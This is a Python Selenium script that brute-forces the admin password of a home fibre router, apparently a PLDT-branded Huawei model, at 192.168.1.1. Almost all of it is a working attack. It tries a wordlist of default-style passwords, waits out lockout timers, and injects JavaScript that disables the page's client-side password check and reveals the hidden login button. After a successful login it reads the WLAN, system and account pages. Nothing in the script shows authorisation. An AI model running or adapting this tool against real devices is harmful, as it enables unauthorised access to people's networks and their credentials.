#!/usr/bin/env python3
"""Final attempts: probe every possible path and try brute-force admin password."""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    opts.add_argument("--incognito")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(10)
    return driver

driver = setup_driver()
try:
    # 1. Brute force admin password via login.asp (bypassing client check)
    print("1. Brute-forcing admin password via login.asp...")
    common_8char = [
        "Admin1234", "Admin12345", "PLDT1234", "PLDTHOME", "PLDTHM12",
        "password", "PASSWORD", "12345678", "87654321", "admin123",
        "admin1234", "Admin@123", "P@ssword", "admin@12", "PLDT@1234",
        "PLDTH@12", "PLDT2024", "Admin2024", "admin2024", "HUAWEI12",
        "HWAdmin1", "adminpldt", "superadm", "telecom", "PLDTWIFI",
        "PLDTHOME1", "FIBR1234", "fibr1234", "fiber1234", "FIBER1234",
        "PLDTH@1234", "Admin@1234", "admin@1234", "P@ssw0rd", "p@ssword",
        "Welcome1", "welcome1", "Change12", "Default1", "Password1",
        "1234Admin", "abcd1234", "abcd1234!", "P@ss1234", "Pass@1234",
        "1234abcd", "Test1234", "test1234", "user1234", "User1234",
        "PLDT12345", "PLDTHM123", "PLDT@123", "PLDT123", "Fibr@1234",
        "Fibr1234", "FIBR@1234", "WIFI1234", "wifi1234", "1234wifi",
        "1234fibr", "1234FIBR", "1234PLDT", "admin1234", "Admin12345",
        "PLDTHOM3", "PLDTH0M3", "pldthome", "PLDTHome", "Admin!123",
        "admin!123", "Aa123456", "aA123456", "Qwerty12", "qwerty12",
        "Abcd1234", "abcd1234", "Admin#123", "P@ssw0rd!", "Passw0rd",
        "Huawei12", "huawei12", "HG8145X6", "hg8145x6", "Tel$ec01",
        "Admin@#12", "admin@#12", "P@ssw0rd1", "Admin@123!",
    ]

    # First check lockout state
    driver.get(ROUTER + "/login.asp")
    time.sleep(3)
    lock = driver.execute_script("try { return window.LockLeftTime; } catch(e) { return 'n/a'; }")
    print("   LockLeftTime:", lock)
    if str(lock) != "0" and str(lock) != "undefined" and str(lock) != "n/a":
        print("   Locked, waiting...")
        time.sleep(int(str(lock)) + 10)

    success = False
    for i, pwd in enumerate(common_8char):
        driver.get(ROUTER + "/login.asp")
        time.sleep(2)

        # Check lockout
        lock = driver.execute_script("try { return window.LockLeftTime; } catch(e) { return 'n/a'; }")
        if str(lock) not in ("0", "undefined", "n/a", ""):
            wait = int(str(lock)) + 5
            if wait > 300:
                print("   Lockout too long (" + str(wait) + "s), stopping")
                break
            print("   [" + str(i) + "] Locked " + str(wait) + "s, waiting...")
            time.sleep(wait)
            continue

        has_login = "txt_Username" in driver.page_source
        if not has_login:
            print("   [" + str(i) + "] No login form, checking...")
            time.sleep(3)
            has_login = "txt_Username" in driver.page_source
            if not has_login:
                print("   *** NO LOGIN FORM - possible success! ***")

        u = driver.find_element(By.ID, "txt_Username")
        p = driver.find_element(By.ID, "txt_Password")
        driver.execute_script("arguments[0].value=''; arguments[1].value='';", u, p)
        u.send_keys("admin")
        p.send_keys(pwd)
        driver.execute_script("""
            window.CheckPassword = function() { return 0; };
            window.setDisable = function() {};
        """)
        driver.execute_script("document.getElementById('button').style.display='';")
        driver.find_element(By.ID, "button").click()
        time.sleep(4)

        url = driver.current_url
        has_login2 = "txt_Username" in driver.page_source
        lock2 = driver.execute_script("try { return window.LockLeftTime; } catch(e) { return 'n/a'; }")

        if not has_login2 and "login" not in url.lower():
            print("\n   *** SUCCESS with admin:" + pwd + " ***")
            print("   URL:", url)
            success = True
            break

        if str(lock2) not in ("0", "undefined", "n/a", "") and str(lock2) != str(lock):
            print("   [" + str(i) + "] admin:" + pwd + " -> LOCKED (" + str(lock2) + "s)")
        else:
            print("   [" + str(i) + "] admin:" + pwd + " -> FAIL")

    if success:
        print("\n2. Accessing protected pages...")
        for pg in ["/html/amp/wlanbasic/WlanBasic.asp?2G",
                    "/html/ssmp/info/basic/system_info.asp",
                    "/html/ssmp/accout/UserInfo.asp"]:
            driver.get(ROUTER + pg)
            time.sleep(3)
            has_l = "txt_Username" in driver.page_source
            print("   " + pg + " -> login:" + str(has_l))

finally:
    driver.quit()
